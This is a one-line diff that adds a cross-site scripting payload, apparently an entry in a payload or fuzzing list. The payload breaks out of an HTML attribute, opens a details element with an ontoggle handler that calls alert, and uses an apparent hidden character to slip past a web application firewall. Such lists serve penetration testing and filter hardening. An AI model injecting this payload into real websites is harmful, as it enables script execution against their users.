@@ -1,1 +1,1 @@
-
+"><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
